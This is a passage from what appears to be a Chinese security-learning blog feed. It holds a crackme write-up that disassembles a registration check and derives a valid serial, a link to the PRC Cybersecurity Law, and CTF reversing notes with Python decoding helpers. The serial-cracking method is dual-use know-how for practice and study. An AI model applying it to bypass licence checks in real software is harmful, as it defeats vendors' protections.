 5E              pop     esi</div><div class="line">01151E2F    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E32    33CD            xor     ecx, ebp</div><div class="line">01151E34    5F              pop     edi</div><div class="line">01151E35    E8 8B0E0000     call    01152CC5</div><div class="line">01151E3A    8BE5            mov     esp, ebp</div><div class="line">01151E3C    5D              pop     ebp</div><div class="line">01151E3D    C3              retn</div><div class="line">01151E3E    6A 00           push    0x0</div><div class="line">01151E40    E8 6C2D0000     call    01154BB1</div></pre></td></tr></table></figure></p><p>以上代码得出注册码必须为7位并且包含字符’b’,’p’<br>再看最后的判断call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line">01151870    55              push    ebp</div><div class="line">01151871    8BEC            mov     ebp, esp</div><div class="line">01151873    83EC 54         sub     esp, 0x54</div><div class="line">01151876    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">0115187B    33C5            xor     eax, ebp</div><div class="line">0115187D    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151880    53              push    ebx</div><div class="line">01151881    56              push    esi</div><div class="line">01151882    57              push    edi</div><div class="line">01151883    6A 36           push    0x36</div><div class="line">01151885    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">01151888    8BD9            mov     ebx, ecx</div><div class="line">0115188A    6A 00           push    0x0</div><div class="line">0115188C    50              push    eax</div><div class="line">0115188D    8BFA            mov     edi, edx</div><div class="line">0115188F    895D AC         mov     dword ptr [ebp-0x54], ebx</div><div class="line">01151892    E8 39210000     call    &lt;memset&gt;</div><div class="line">01151897    83C4 0C         add     esp, 0xC</div><div class="line">0115189A    8D4D E8         lea     ecx, dword ptr [ebp-0x18]</div><div class="line">0115189D    B8 30000000     mov     eax, 0x30</div><div class="line">011518A2    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518A5    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518A8    40              inc     eax</div><div class="line">011518A9    83F8 39         cmp     eax, 0x39</div><div class="line">011518AC  ^ 7E F4           jle     short 011518A2                   ; 0-9</div><div class="line">011518AE    B8 61000000     mov     eax, 0x61</div><div class="line">011518B3    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011518B6    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518B9    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518BC    40              inc     eax</div><div class="line">011518BD    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518C0  ^ 7E F4           jle     short 011518B6                   ; a-z</div><div class="line">011518C2    33D2            xor     edx, edx</div><div class="line">011518C4    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">011518C7    66:3955 B0      cmp     word ptr [ebp-0x50], dx</div><div class="line">011518CB    74 0D           je      short 011518DA</div><div class="line">011518CD    0F1F            ???                                      ; 未知命令</div><div class="line">011518CF    008D 40024266   add     byte ptr [ebp+0x66420240], cl</div><div class="line">011518D5    8338 00         cmp     dword ptr [eax], 0x0</div><div class="line">011518D8  ^ 75 F6           jnz     short 011518D0</div><div class="line">011518DA    33C9            xor     ecx, ecx</div><div class="line">011518DC    85D2            test    edx, edx</div><div class="line">011518DE    74 1C           je      short 011518FC</div><div class="line">011518E0    0FB7444D B0     movzx   eax, word ptr [ebp+ecx*2-0x50]</div><div class="line">011518E5    83F8 61         cmp     eax, 0x61</div><div class="line">011518E8    72 0D           jb      short 011518F7</div><div class="line">011518EA    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518ED    77 08           ja      short 011518F7</div><div class="line">011518EF    83C0 E0         add     eax, -0x20</div><div class="line">011518F2    66:89444D B0    mov     word ptr [ebp+ecx*2-0x50], ax</div><div class="line">011518F7    41              inc     ecx</div><div class="line">011518F8    3BCA            cmp     ecx, edx</div><div class="line">011518FA  ^ 72 E4           jb      short 011518E0</div><div class="line">011518FC    33C9            xor     ecx, ecx</div><div class="line">011518FE    8BC7            mov     eax, edi</div><div class="line">01151900    85FF            test    edi, edi</div><div class="line">01151902    74 76           je      short 0115197A</div><div class="line">01151904    66:390F         cmp     word ptr [edi], cx</div><div class="line">01151907    74 11           je      short 0115191A</div><div class="line">01151909    0F1F            ???                                      ; 未知命令</div><div class="line">0115190B    8000 00         add     byte ptr [eax], 0x0</div><div class="line">0115190E    0000            add     byte ptr [eax], al</div><div class="line">01151910    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151913    41              inc     ecx</div><div class="line">01151914    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151918  ^ 75 F6           jnz     short 01151910</div><div class="line">0115191A    33C0            xor     eax, eax</div><div class="line">0115191C    85C9            test    ecx, ecx</div><div class="line">0115191E    74 22           je      short 01151942</div><div class="line">01151920    83F8 02         cmp     eax, 0x2</div><div class="line">01151923    73 07           jnb     short 0115192C</div><div class="line">01151925    66:833447 0F    xor     word ptr [edi+eax*2], 0xF</div><div class="line">0115192A    EB 11           jmp     short 0115193D</div><div class="line">0115192C    83F8 04         cmp     eax, 0x4</div><div class="line">0115192F    73 07           jnb     short 01151938</div><div class="line">01151931    66:833447 50    xor     word ptr [edi+eax*2], 0x50</div><div class="line">01151936    EB 05           jmp     short 0115193D</div><div class="line">01151938    66:833447 42    xor     word ptr [edi+eax*2], 0x42</div><div class="line">0115193D    40              inc     eax</div><div class="line">0115193E    3BC1            cmp     eax, ecx</div><div class="line">01151940  ^ 72 DE           jb      short 01151920</div><div class="line">01151942    33D2            xor     edx, edx</div><div class="line">01151944    8BC7            mov     eax, edi</div><div class="line">01151946    66:3917         cmp     word ptr [edi], dx</div><div class="line">01151949    74 0F           je      short 0115195A</div><div class="line">0115194B    0F1F            ???                                      ; 未知命令</div><div class="line">0115194D    44              inc     esp</div><div class="line">0115194E    0000            add     byte ptr [eax], al</div><div class="line">01151950    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151953    42              inc     edx</div><div class="line">01151954    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151958  ^ 75 F6           jnz     short 01151950</div><div class="line">0115195A    33C9            xor     ecx, ecx</div><div class="line">0115195C    85D2            test    edx, edx</div><div class="line">0115195E    74 1A           je      short 0115197A</div><div class="line">01151960    0FB7044F        movzx   eax, word ptr [edi+ecx*2]</div><div class="line">01151964    83F8 61         cmp     eax, 0x61</div><div class="line">01151967    72 0C           jb      short 01151975</div><div class="line">01151969    83F8 7A         cmp     eax, 0x7A</div><div class="line">0115196C    77 07           ja      short 01151975</div><div class="line">0115196E    83C0 E0         add     eax, -0x20</div><div class="line">01151971    66:89044F       mov     word ptr [edi+ecx*2], ax</div><div class="line">01151975    41              inc     ecx</div><div class="line">01151976    3BCA            cmp     ecx, edx</div><div class="line">01151978  ^ 72 E6           jb      short 01151960</div><div class="line">0115197A    33F6            xor     esi, esi</div><div class="line">0115197C    0F57C0          xorps   xmm0, xmm0</div><div class="line">0115197F    66:0FD6         ???                                      ; 未知命令</div><div class="line">01151982    45              inc     ebp</div><div class="line">01151983    F0:66:8975 F8   lock mov word ptr [ebp-0x8], si          ; 不允许锁定前缀</div><div class="line">01151988    66:3937         cmp     word ptr [edi], si</div><div class="line">0115198B    74 48           je      short 011519D5</div><div class="line">0115198D    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">01151991    8D5D F0         lea     ebx, dword ptr [ebp-0x10]</div><div class="line">01151994    8BC7            mov     eax, edi</div><div class="line">01151996    66:85C9         test    cx, cx</div><div class="line">01151999    74 2C           je      short 011519C7</div><div class="line">0115199B    0FB710          movzx   edx, word ptr [eax]</div><div class="line">0115199E    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519A1    33C0            xor     eax, eax</div><div class="line">011519A3    66:3B11         cmp     dx, word ptr [ecx]</div><div class="line">011519A6    74 10           je      short 011519B8</div><div class="line">011519A8    40              inc     eax</div><div class="line">011519A9    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011519AC    66:833C41 00    cmp     word ptr [ecx+eax*2], 0x0</div><div class="line">011519B1    8D0C41          lea     ecx, dword ptr [ecx+eax*2]</div><div class="line">011519B4  ^ 75 ED           jnz     short 011519A3</div><div class="line">011519B6    EB 0B           jmp     short 011519C3</div><div class="line">011519B8    66:8B4445 B0    mov     ax, word ptr [ebp+eax*2-0x50]</div><div class="line">011519BD    66:8903         mov     word ptr [ebx], ax</div><div class="line">011519C0    83C3 02         add     ebx, 0x2</div><div class="line">011519C3    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">011519C7    46              inc     esi</div><div class="line">011519C8    66:833C77 00    cmp     word ptr [edi+esi*2], 0x0</div><div class="line">011519CD    8D0477          lea     eax, dword ptr [edi+esi*2]</div><div class="line">011519D0  ^ 75 C4           jnz     short 01151996</div><div class="line">011519D2    8B5D AC         mov     ebx, dword ptr [ebp-0x54]</div><div class="line">011519D5    33C9            xor     ecx, ecx</div><div class="line">011519D7    8D45 F0         lea     eax, dword ptr [ebp-0x10]</div><div class="line">011519DA    66:394D F0      cmp     word ptr [ebp-0x10], cx</div><div class="line">011519DE    74 59           je      short 01151A39</div><div class="line">011519E0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">011519E3    41              inc     ecx</div><div class="line">011519E4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">011519E8  ^ 75 F6           jnz     short 011519E0</div><div class="line">011519EA    83F9 02         cmp     ecx, 0x2</div><div class="line">011519ED    75 4A           jnz     short 01151A39</div><div class="line">011519EF    33C0            xor     eax, eax</div><div class="line">011519F1    C745 F0 3100350&gt;mov     dword ptr [ebp-0x10], 0x350031</div><div class="line">011519F8    C745 F4 5000420&gt;mov     dword ptr [ebp-0xC], 0x420050</div><div class="line">011519FF    8D77 04         lea     esi, dword ptr [edi+0x4]</div><div class="line">01151A02    66:8945 F8      mov     word ptr [ebp-0x8], ax</div><div class="line">01151A06    33C9            xor     ecx, ecx</div><div class="line">01151A08    0F1F            ???                                      ; 未知命令</div><div class="line">01151A0A    8400            test    byte ptr [eax], al</div><div class="line">01151A0C    0000            add     byte ptr [eax], al</div><div class="line">01151A0E    0000            add     byte ptr [eax], al</div><div class="line">01151A10    66:8B444D F0    mov     ax, word ptr [ebp+ecx*2-0x10]</div><div class="line">01151A15    66:3B06         cmp     ax, word ptr [esi]</div><div class="line">01151A18    75 1F           jnz     short 01151A39</div><div class="line">01151A1A    41              inc     ecx</div><div class="line">01151A1B    83C6 02         add     esi, 0x2</div><div class="line">01151A1E    83F9 04         cmp     ecx, 0x4</div><div class="line">01151A21  ^ 72 ED           jb      short 01151A10</div><div class="line">01151A23    8BD7            mov     edx, edi</div><div class="line">01151A25    8BCB            mov     ecx, ebx</div><div class="line">01151A27    E8 14FDFFFF     call    01151740         ; 这里是最后判断的call，</div><div class="line">01151A2C    6A 00           push    0x0</div><div class="line">01151A2E    85C0            test    eax, eax</div><div class="line">01151A30    74 09           je      short 01151A3B</div><div class="line">01151A32    68 0B040000     push    0x40B</div><div class="line">01151A37    EB 07           jmp     short 01151A40</div><div class="line">01151A39    6A 00           push    0x0</div><div class="line">01151A3B    68 0A040000     push    0x40A</div><div class="line">01151A40    68 11010000     push    0x111</div><div class="line">01151A45    FF73 04         push    dword ptr [ebx+0x4]</div><div class="line">01151A48    FF15 54811601   call    dword ptr [&lt;&amp;USER32.PostMessageW&gt;; user32.PostMessageW</div></pre></td></tr></table></figure></p><p>以上代码比如初始化0-9,a-z，注册码转换成大写，提取出注册码里所有的字母，纯属多余<br>接下去直接看里面最后的call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01151810   &gt; /66:8B01       mov     ax, word ptr [ecx]</div><div class="line">01151813   . |66:3B040E     cmp     ax, word ptr [esi+ecx]           ;  判断第1,2位是否为&apos;12&apos;</div><div class="line">01151817   . |75 42         jnz     short 0115185B</div><div class="line">01151819   . |83C2 06       add     edx, 0x6</div><div class="line">0115181C   . |83C1 02       add     ecx, 0x2</div><div class="line">0115181F   . |83FA 39       cmp     edx, 0x39</div><div class="line">01151822   .^\7E EC         jle     short 01151810</div><div class="line">01151824   .  0FB74F 12     movzx   ecx, word ptr [edi+0x12]    ； 第i位字符+第1位字符是否为0x63（设计不合理?）</div><div class="line">01151828   .  0FB703        movzx   eax, word ptr [ebx]</div><div class="line">0115182B   .  03C8          add     ecx, eax</div><div class="line">0115182D   .  83F9 63       cmp     ecx, 0x63</div><div class="line">01151830   .  75 29         jnz     short 0115185B</div><div class="line">01151832   .  8B45 B4       mov     eax, dword ptr [ebp-0x4C]</div><div class="line">01151835   .  0FB74F 0C     movzx   ecx, word ptr [edi+0xC]</div><div class="line">01151839   .  0308          add     ecx, dword ptr [eax]</div><div class="line">0115183B   .  8B45 B0       mov     eax, dword ptr [ebp-0x50]</div><div class="line">0115183E   .  0FB700        movzx   eax, word ptr [eax]</div><div class="line">01151841   .  3BC1          cmp     eax, ecx</div><div class="line">01151843   .  75 16         jnz     short 0115185B    ; 这里判断注册码最后一位是否等于用&apos;123456789&apos;替换了注册码的n位之后的字符判断的第0x0c位+n是否相等</div><div class="line">01151845   .  5F            pop     edi</div><div class="line">01151846   .  5E            pop     esi</div><div class="line">01151847   .  B8 01000000   mov     eax, 0x1</div><div class="line">0115184C   .  5B            pop     ebx</div></pre></td></tr></table></figure></p><p>以上分析完成得到一组注册码1215pb8<br>1）包含字符’b’’’p’<br>2)  7位长度<br>3)  第1、2位为’1’’2’<br>4） 第0位字符’1’(0x30)+第n位字符(计数所在位)’2’(0x32) = 0x63<br>5)  第3、4、5、6位为’15pb’<br>6)  最后1位为‘7’+计数</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>中华人民共和国网络安全法</title>
    <link href="http://yoursite.com/2017/11/07/misc_fa/"/>
    <id>http://yoursite.com/2017/11/07/misc_fa/</id>
    <published>2017-11-07T07:58:07.243Z</published>
    <updated>2017-11-09T11:37:38.202Z</updated>
    
    <content type="html"><![CDATA[<p>必学中华人民共和国网络安全法<br><a id="more"></a></p><h2 id="1、链接"><a href="#1、链接" class="headerlink" title="1、链接"></a>1、链接</h2><p><a href="https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html" target="_blank" rel="external">https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;必学中华人民共和国网络安全法&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE--某秋的比赛</title>
    <link href="http://yoursite.com/2017/11/05/re_suanfa/"/>
    <id>http://yoursite.com/2017/11/05/re_suanfa/</id>
    <published>2017-11-05T03:07:19.715Z</published>
    <updated>2017-11-09T11:55:35.829Z</updated>
    
    <content type="html"><![CDATA[<p>完全被打蒙<br><a id="more"></a><br>昨天ctf，怀疑自己到疯，代码不会写，这里记录一下，以后方便用到</p><h2 id="1、花指令"><a href="#1、花指令" class="headerlink" title="1、花指令"></a>1、花指令</h2><p>6789abcd –&gt; 3637383961626364 -&gt;6789abcd<br><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p>b=’66778899’  –&gt; [0x66,0x77,0x88,0x99]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">def fen(b):</div><div class="line">    k = len(b)</div><div class="line">    n=[]</div><div class="line">    for i in range(len(b)-6):</div><div class="line">        if i%6==0:</div><div class="line">            n.append(b[i]+b[i+1])</div><div class="line">            n.append(b[i+2]+b[i+3])</div><div class="line">            n.append(b[i+4]+b[i+5])</div><div class="line">            i = i + 6</div><div class="line">    n.append(b[k - 6] + b[k - 5])</div><div class="line">    n.append(b[k - 4] + b[k - 3])</div><div class="line">    n.append(b[k - 2] + b[k - 1])</div><div class="line"></div><div class="line">    k = []</div><div class="line">    for i in range(len(n)):</div><div class="line">        k.append(hex(int(n[i], 16)))</div><div class="line">    return k</div></pre></td></tr></table></figure></p><p>最后附上，自己的juckcode.代码<br>思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">flag + base64</div><div class="line">k=flag+0x40 +base64</div><div class="line">flag=(k*7)%256</div><div class="line">flag=(flag+0x40) *7)%256</div><div class="line">算法1</div><div class="line">ZpYA           mqmA             9+LC</div><div class="line">大写-0x41</div><div class="line">小写-0x47</div><div class="line">数字+0x4</div><div class="line">+   0x13            </div><div class="line">7a z 61 a 33-1a</div><div class="line">5a Z 40 A 19-00</div><div class="line">shuz  0-9 34-3d</div><div class="line">3e        3e-13     </div><div class="line">算法2</div><div class="line">第一位 </div><div class="line">第二位</div><div class="line">第三位</div><div class="line">a1=0x2c</div><div class="line">a2=0x30</div><div class="line">a3=0x2c</div><div class="line">a4=0</div><div class="line">a1=0x19</div><div class="line">a2=0x29</div><div class="line">a3=0x18</div><div class="line">a4=0</div><div class="line">k=a1*4+(a2&amp;0x30)/16</div><div class="line">print k</div><div class="line">k=(a3&amp;0x3c)/4+(a2&amp;0x0f)*16</div><div class="line">print k</div><div class="line">k=((a3&amp;0x03)*2**6)%256+a4</div><div class="line">print k</div></pre></td></tr></table></figure></p><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">import base64</div><div class="line">#分解flag_enc</div><div class="line">c1=[]</div><div class="line"># def fen():</div><div class="line">#     a = &apos;FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@&apos;</div><div class="line">#     for i in a:</div><div class="line">#         c.append(chr(ord(i) - 16))</div><div class="line">#     b = &quot;&quot;.join(c)</div><div class="line">#     k = len(b)</div><div class="line">#     print b</div><div class="line">#     for i in range(len(b)-6):</div><div class="line">#         if i%6==0:</div><div class="line">#             n.append(b[i]+b[i+1])</div><div class="line">#             n.append(b[i+2]+b[i+3])</div><div class="line">#             n.append(b[i+4]+b[i+5])</div><div class="line">#             i = i + 6</div><div class="line">#     n.append(b[k - 6] + b[k - 5])</div><div class="line">#     n.append(b[k - 4] + b[k - 3])</div><div class="line">#     n.append(b[k - 2] + b[k - 1])</div><div class="line">#</div><div class="line">#     print n</div><div class="line">#匹配字符</div><div class="line">def bp():</div><div class="line">    # n=[&apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;a9&apos;, &apos;80&apos;, &apos;c7&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;86&apos;, &apos;18&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;b6&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;aa&apos;, &apos;a8&apos;, &apos;80&apos;, &apos;76&apos;, &apos;de&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;ae&apos;, &apos;b8&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;be&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;18&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;62&apos;, &apos;8e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;14&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;b6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;be&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;04&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;7a&apos;, &apos;ee&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;d7&apos;, &apos;58&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;24&apos;, &apos;a2&apos;, &apos;c2&apos;, &apos;96&apos;, &apos;58&apos;, &apos;80&apos;, &apos;76&apos;, &apos;d6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;40&apos;, &apos;cb&apos;, &apos;28&apos;, &apos;80&apos;, &apos;72&apos;, &apos;ce&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;96&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;d3&apos;, &apos;42&apos;, &apos;00&apos;]</div><div class="line">    # k=len(n)</div><div class="line">    # print k</div><div class="line">    # for i in range(len(n)-3):</div><div class="line">    #     if i % 3 == 0:</div><div class="line">    #         k1=int(n[i], 16)</div><div class="line">    #         k2=int(n[i+1], 16)</div><div class="line">    #         k3=int(n[i+2], 16)</div><div class="line">    #         print i,hex(k1),hex(k2),hex(k3)</div><div class="line">    #         bp1(k1, k2, k3)</div><div class="line">    #</div><div class="line">    # k1 = int(int(n[k-3], 16))</div><div class="line">    # k2 = int(int(n[k-2], 16))</div><div class="line">    # k3 = int(int(n[k-1], 16))</div><div class="line">    # bp1(k1, k2, k3)</div><div class="line"></div><div class="line">    q=[]</div><div class="line">    c1=[90, 109, 120, 104, 90, 51, 116, 113, 100, 87, 78, 114, 88, 50, 78, 118, 90, 71, 86, 102, 89, 50, 70, 117, 98, 109, 48, 88, 51, 78, 48, 98, 51, 66, 102, 101, 87, 49, 88, 51, 74, 108, 100, 109, 86, 121, 99, 50, 108, 117, 90, 51, 48]</div><div class="line">    print c1</div><div class="line">    for i in range(len(c1)):</div><div class="line">        q.append(chr(c1[i]))</div><div class="line">    print &quot;&quot;.join(q)</div><div class="line"></div><div class="line">def bp1(k1,k2,k3):</div><div class="line">    begin = 